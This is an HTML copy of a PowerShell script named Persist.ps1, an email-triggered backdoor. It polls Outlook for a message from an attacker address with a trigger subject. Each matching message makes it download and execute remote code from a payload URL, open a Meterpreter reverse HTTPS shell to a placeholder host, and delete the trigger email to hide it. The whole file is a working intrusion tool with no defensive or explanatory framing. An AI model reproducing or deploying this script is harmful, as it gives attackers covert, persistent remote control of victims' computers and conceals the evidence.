<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Persist.ps1</title>
</head><body>$AttackerEmail = &quot;ATTACKEREMAIL@EMAIL.COM&quot;<br/>
$TriggerWord = &quot;EMAILSUBJECT&quot;<br/>
<br/>
While($True){<br/>
$olFolderInbox = 6<br/>
$outlook = new-object -com outlook.application;<br/>
$ns = $outlook.GetNameSpace(&quot;MAPI&quot;);<br/>
$inbox = $ns.GetDefaultFolder($olFolderInbox)<br/>
$Emails = $inbox.items<br/>
$Emails | foreach { <br/>
if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)<br/>
{Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient<br/>
IEX $WebClientObject.DownloadString('PAYLOAD_URL')<br/>
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.xx.xxx -LPORT yyyy -Force}<br/>
}}<br/>
<br/>
$Emails | foreach { <br/>
if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)<br/>
{$OutlookFolders = $outlook.Session.Folders.Item(1).Folders<br/>
$EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item(&quot;Inbox&quot;).Items<br/>
$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq $TriggerWord -and $_.SenderEmailAddress -eq $AttackerEmail}<br/>
$EmailToDelete.Delete() }<br/>
<br/>
}<br/>
#This determines how often the script checks in. Lower sleep time == more noise <br/>
Start-Sleep -s 10 <br/>
<br/>
<br/>
<br/>
<br/>
<br/>
}<br/>
</body></html>